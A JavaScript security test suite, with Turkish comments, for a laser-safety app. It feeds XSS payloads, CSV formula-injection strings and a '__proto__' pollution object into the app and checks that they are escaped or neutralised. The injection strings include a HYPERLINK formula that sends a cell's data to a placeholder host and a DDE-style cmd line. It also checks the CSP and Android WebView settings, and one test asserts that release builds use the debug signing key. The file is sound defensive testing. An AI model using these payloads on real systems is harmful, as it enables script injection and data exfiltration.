'use strict';
/*
 * Güvenlik sözleşmesi (siber güvenlik incelemesi, 16.11.2026):
 *  - XSS: forma yazılan, içe aktarılan ya da köprüden gelen hiçbir metin sayfaya kaçışsız basılmaz
 *  - CSV formül enjeksiyonu: =, +, -, @ ile başlayan metin hücreleri etkisizleştirilir
 *  - İçe aktarmada "__proto__" anahtarı form durumunun prototipini değiştiremez
 *  - İçerik Güvenlik Politikası (CSP): dağıtılan tek dosyada yalnız gömülü betikler çalışır, ağ ve çerçeve yok
 *  - Android: içerik erişimi kapalı, dış bağlantı açılmaz, yedek/cihaz aktarımı yok, dağıtım derlemesi debug değil
 */
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const { execFileSync } = require('child_process');
const { LE } = require('./helpers');

class MemStore {
  constructor() { this.m = new Map(); }
  getItem(k) { return this.m.has(k) ? this.m.get(k) : null; }
  setItem(k, v) { this.m.set(k, String(v)); }
  removeItem(k) { this.m.delete(k); }
  clear() { this.m.clear(); }
}
globalThis.localStorage = new MemStore();
const ROOT = path.join(__dirname, '..');
const UI = path.join(ROOT, 'js', 'ui');
for (const m of ['version', 'i18n', 'lang_en', 'examples', 'form', 'render', 'store', 'report', 'help', 'license', 'about', 'amsler']) require(path.join(UI, m + '.js'));
const ANDROID = path.join(ROOT, 'android', 'app', 'src', 'main');

/** Saldırı metinleri: etiket, olay işleyicisi ve öznitelikten kaçış denemeleri. */
const PAYLOADS = [
  '<img src=x onerror="window.__xss=1">',
  '"><svg onload=window.__xss=1>',
  "'><script>window.__xss=1</script>",
  '</textarea><iframe src=javascript:alert(1)>',
  '" autofocus onfocus="window.__xss=1',
  "' onmouseover='window.__xss=1",
];
/** Kaçışsız basılmışsa çıktıda görünecek parçalar (uygulamanın kendi işaretlemesinde bulunmaz). */
const RAW = ['<img', '<iframe', '<script', '<svg onload', '</textarea', '" autofocus onfocus="', "' onmouseover='"];

function noRaw(html, where) {
  for (const r of RAW) assert.ok(!html.includes(r), where + ': kaçışsız "' + r + '"');
}

function withDocument(fn) {
  const had = 'document' in globalThis;
  const old = globalThis.document;
  globalThis.document = { styleSheets: [], documentElement: { lang: 'tr' } };
  try { return fn(); } finally { if (had) globalThis.document = old; else delete globalThis.document; }
}

const IDENT = ['name', 'maker', 'modelNo', 'serial', 'inv', 'loc', 'owner', 'lso', 'date', 'app', 'notes'];

test('XSS: kimlik alanlarındaki saldırı metni sonuç ekranında, raporda ve kaydedilen HTML raporda kaçışlı', () => {
  const s = LE.form.defaultState();
  IDENT.forEach((id, i) => { s.v[id] = PAYLOADS[i % PAYLOADS.length] + ' ' + id; });
  LE.form.setState(s);
  const r = LE.form.read();
  assert.ok(r.ok, 'kimlik alanları hesabı bozmaz');
  const o = LE.analysis.analyze(r.inp);
  const box = { innerHTML: '', querySelector: () => null };
  LE.render.render(box, o, { formErrors: [], formWarnings: [PAYLOADS[0]] });
  noRaw(box.innerHTML, 'sonuç ekranı');
  const rep = LE.report.build(o, LE.form.getState(), { reportId: PAYLOADS[1], selftest: { passed: 64, total: 64 } });
  noRaw(rep, 'rapor');
  for (const id of IDENT) assert.ok(rep.includes(LE.render.esc(PAYLOADS[IDENT.indexOf(id) % PAYLOADS.length])), 'raporda kaçışlı görünür: ' + id);
  withDocument(() => noRaw(LE.report.standaloneHTML(rep, PAYLOADS[2]), 'kaydedilen HTML rapor'));
});

test('XSS: sayı ve seçim alanlarına yazılan saldırı metni hata kutusunda kaçışlı', () => {
  const s = LE.form.defaultState();
  let i = 0;
  for (const id in LE.form.FIELDS) {
    const t = LE.form.FIELDS[id].type;
    if (t === 'num' || t === 'select' || t === 'seg' || (t === 'text' && IDENT.indexOf(id) < 0)) s.v[id] = PAYLOADS[i++ % PAYLOADS.length];
  }
  s.u.P = PAYLOADS[3];
  LE.form.setState(s);
  const r = LE.form.read();
  assert.equal(r.ok, false);
  const errs = Object.keys(r.errs).map((id) => id + ': ' + r.errs[id]);
  const box = { innerHTML: '', querySelector: () => null };
  LE.render.render(box, { ok: false, errors: [] }, { formErrors: errs, formWarnings: [] });
  noRaw(box.innerHTML, 'hata kutusu');
  LE.form.setState(LE.form.defaultState());
});

test('XSS: Amsler kişi/olay adları ve Hakkında penceresindeki cihaz bilgisi kaçışlı', () => {
  const rec = { id: 'A1', at: '2026-11-16T09:00:00.000Z', person: PAYLOADS[0], event: PAYLOADS[1], R: ['0,0'], L: [], sym: ['spot'], cols: { R: 12, L: 12 }, rows: { R: 20, L: 20 }, source: 'card' };
  const prev = Object.assign({}, rec, { id: 'A0', at: '2026-11-01T09:00:00.000Z', person: PAYLOADS[0], event: PAYLOADS[4] });
  for (const [k, h] of Object.entries({
    sonuç: LE.amsler.html.result(rec, prev, true), geçmiş: LE.amsler.html.history([rec, prev]), rapor: LE.amsler.html.report(rec, prev),
  })) noRaw(h, 'Amsler ' + k);
  globalThis.LazerAndroid = { appInfo: () => JSON.stringify({ versionName: PAYLOADS[2], versionCode: PAYLOADS[5], release: PAYLOADS[3], sdk: 35, device: PAYLOADS[0], webview: PAYLOADS[1] }) };
  try {
    noRaw(LE.about.html({ passed: 64, total: 64 }), 'Hakkında');
  } finally {
    delete globalThis.LazerAndroid;
  }
});

test('CSV formül enjeksiyonu: =, +, -, @, sekme ile başlayan metin hücresi tek tırnakla etkisiz; sayılar değişmez', () => {
  const evil = ['=HYPERLINK("http://ornek.invalid/?d="&A1;"tikla")', '+1+1', "-2+3+cmd|' /C calc'!A0", '@SUM(1+1)*cmd', '\t=1+1', '\r=1+1'];
  const recs = evil.map((e, i) => ({ id: 'E' + i, state: { v: { name: e }, u: {} }, summary: { name: e, maker: e, loc: e, marking: e, date: e, wl: 532, nohd: 12.5, odWorst: -0.52 } }));
  recs.push({ id: 'N1', state: { v: { name: '-12,5' }, u: {} }, summary: { name: '-12,5', odWorst: -0.52 } });
  localStorage.clear();
  LE.store.importJSON(JSON.stringify(recs));
  const files = [];
  globalThis.LazerAndroid = { saveFile: (n, m, t) => files.push(t) };
  try {
    LE.store.exportCSV(LE.store.loadInventory());
  } finally {
    delete globalThis.LazerAndroid;
  }
  const lines = files[0].replace(/^\uFEFF/, '').split('\r\n').slice(1);
  const cells = (line) => line.match(/("([^"]|"")*"|[^;]*)(;|$)/g).map((c) => c.replace(/;$/, '').replace(/^"(.*)"$/s, '$1').replace(/""/g, '"'));
  for (let i = 0; i < evil.length; i++) {
    const c = cells(lines[i]);
    for (const k of [0, 1, 6, 14, 16]) assert.ok(c[k].startsWith("'"), 'hücre ' + k + ' etkisiz değil: ' + JSON.stringify(c[k]));
    assert.equal(c[13], '-0,52', 'sayısal OD sütunu değişmez');
  }
  assert.equal(cells(lines[evil.length])[0], '-12,5', 'yalnız sayı olan metin değişmez');
  localStorage.clear();
});

test('içe aktarma: "__proto__" anahtarı form durumunun prototipini değiştiremez, yalnız bilinen alanlar alınır', () => {
  const text = '[{"id":"P1","state":{"v":{"__proto__":{"kirli":"evet","P":"999"},"name":"P1","bilinmeyen":"x"},"u":{"__proto__":{"P":"kW"}}},"summary":{"name":"P1"}}]';
  localStorage.clear();
  LE.store.importJSON(text);
  const rec = LE.store.loadInventory().find((r) => r.id === 'P1');
  LE.form.setState(rec.state);
  const st = LE.form.getState();
  assert.equal(Object.getPrototypeOf(st.v), Object.prototype);
  assert.equal(Object.getPrototypeOf(st.u), Object.prototype);
  assert.equal(st.v.kirli, undefined);
  assert.equal(st.v.bilinmeyen, undefined);
  assert.equal(st.v.name, 'P1');
  assert.equal(({}).kirli, undefined, 'genel Object.prototype temiz');
  LE.form.setState(LE.form.defaultState());
  localStorage.clear();
});

/** Tek dosya derlemesi geçici klasöre. */
function buildDist() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'lazer-csp-'));
  const out = path.join(dir, 'LazerEmniyet.html');
  execFileSync(process.execPath, [path.join(ROOT, 'tools', 'build-single.js'), out], { stdio: 'pipe' });
  const html = fs.readFileSync(out, 'utf8');
  fs.rmSync(dir, { recursive: true, force: true });
  return html;
}

test('CSP: dağıtılan tek dosyada yalnız gömülü betikler (SHA-256) çalışır; ağ, çerçeve, form ve eklenti kapalı', () => {
  const html = buildDist();
  const m = html.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)">/);
  assert.ok(m, 'CSP meta etiketi');
  assert.ok(html.indexOf(m[0]) < html.indexOf('<script'), 'CSP ilk betikten önce');
  const csp = Object.fromEntries(m[1].split(';').map((d) => d.trim()).filter(Boolean).map((d) => { const p = d.split(/\s+/); return [p[0], p.slice(1)]; }));
  assert.deepEqual(csp['default-src'], ["'none'"]);
  for (const d of ['connect-src', 'frame-src', 'object-src', 'base-uri', 'form-action']) assert.deepEqual(csp[d], ["'none'"], d);
  assert.ok(!csp['script-src'].includes("'unsafe-inline'") && !csp['script-src'].includes("'unsafe-eval'"), 'satır içi/eval serbest değil');
  const scripts = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)].map((s) => s[1]);
  assert.ok(scripts.length > 15);
  for (const s of scripts) {
    const h = "'sha256-" + crypto.createHash('sha256').update(s, 'utf8').digest('base64') + "'";
    assert.ok(csp['script-src'].includes(h), 'betiğin özeti CSP\'de yok: ' + s.slice(0, 60));
  }
  assert.equal(csp['script-src'].length, new Set(scripts.map((s) => crypto.createHash('sha256').update(s).digest('base64'))).size, 'fazladan izinli betik yok');
  const markup = html.replace(/<script>[\s\S]*?<\/script>/g, '').replace(/<style>[\s\S]*?<\/style>/g, '');
  assert.doesNotMatch(markup, /<[^>]+\son[a-z]+\s*=/i, 'işaretlemede satır içi olay işleyicisi yok');
  assert.doesNotMatch(markup, /javascript:/i);
});

test('kaynak kodda satır içi olay işleyicisi ve javascript: adresi üretilmez', () => {
  for (const f of fs.readdirSync(UI).filter((x) => x.endsWith('.js') && x !== 'license.js')) {
    const src = fs.readFileSync(path.join(UI, f), 'utf8');
    assert.doesNotMatch(src, /['"`][^'"`\n]*\son(click|error|load|input|change|submit|focus|blur|key\w+|mouse\w+|touch\w+|pointer\w+)\s*=/i, f);
    assert.doesNotMatch(src, /javascript:/i, f);
  }
});

test('kaydedilen HTML rapor betik çalıştıramaz (CSP: default-src none)', () => {
  const h = withDocument(() => LE.report.standaloneHTML('<p>x</p>', 'Rapor'));
  const m = h.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)">/);
  assert.ok(m, 'CSP meta etiketi');
  assert.match(m[1], /default-src 'none'/);
  assert.doesNotMatch(m[1], /script-src/);
  assert.ok(h.indexOf(m[0]) < h.indexOf('<style>'));
});

test('Android: içerik erişimi kapalı, dış adres açılmaz, WebView hata ayıklaması yalnız debug derlemesinde', () => {
  const kt = fs.readFileSync(path.join(ANDROID, 'java', 'com', 'quarka', 'lazeremniyet', 'MainActivity.kt'), 'utf8');
  assert.match(kt, /allowFileAccess = false/);
  assert.match(kt, /allowContentAccess = false/);
  assert.match(kt, /setGeolocationEnabled\(false\)/);
  assert.doesNotMatch(kt, /ACTION_VIEW/, 'sayfadan gelen adres sistem tarayıcısına verilmez');
  const ov = kt.slice(kt.indexOf('override fun shouldOverrideUrlLoading'));
  assert.match(ov.slice(0, ov.indexOf('\n        }\n')), /return true/);
  assert.match(kt, /if \(applicationInfo\.flags and ApplicationInfo\.FLAG_DEBUGGABLE != 0\) \{\s*\/\/[^\n]*\n\s*WebView\.setWebContentsDebuggingEnabled\(true\)/);
  assert.equal((kt.match(/setWebContentsDebuggingEnabled/g) || []).length, 1);
});

test('Android: izin yok, tek açık bileşen, yedek ve cihazdan cihaza aktarım kapalı', () => {
  const mf = fs.readFileSync(path.join(ANDROID, 'AndroidManifest.xml'), 'utf8').replace(/<!--[\s\S]*?-->/g, '');
  assert.doesNotMatch(mf, /<uses-permission/);
  assert.equal((mf.match(/<activity\b/g) || []).length, 1);
  assert.doesNotMatch(mf, /<(service|receiver|provider)\b/);
  assert.match(mf, /android:allowBackup="false"/);
  assert.match(mf, /android:dataExtractionRules="@xml\/data_extraction_rules"/);
  const x = fs.readFileSync(path.join(ANDROID, 'res', 'xml', 'data_extraction_rules.xml'), 'utf8');
  for (const sec of ['cloud-backup', 'device-transfer']) {
    const body = (x.match(new RegExp('<' + sec + '[^>]*>([\\s\\S]*?)</' + sec + '>')) || [])[1];
    assert.ok(body, sec);
    assert.doesNotMatch(body, /<include/, sec + ': içerme yok');
    for (const d of ['root', 'file', 'database', 'sharedpref', 'external', 'device_root', 'device_file', 'device_database', 'device_sharedpref']) {
      assert.match(body, new RegExp('<exclude domain="' + d + '" path="\\."\\s*/>'), sec + ': ' + d);
    }
  }
});

test('Android: dağıtım (release) derlemesi hata ayıklanamaz ve kurulu sürümle aynı anahtarla imzalanır', () => {
  const g = fs.readFileSync(path.join(ROOT, 'android', 'app', 'build.gradle.kts'), 'utf8');
  const rel = g.slice(g.indexOf('release {'), g.indexOf('compileOptions'));
  assert.match(rel, /signingConfig = signingConfigs\.getByName\("debug"\)/);
  assert.doesNotMatch(rel, /isDebuggable\s*=\s*true/);
});
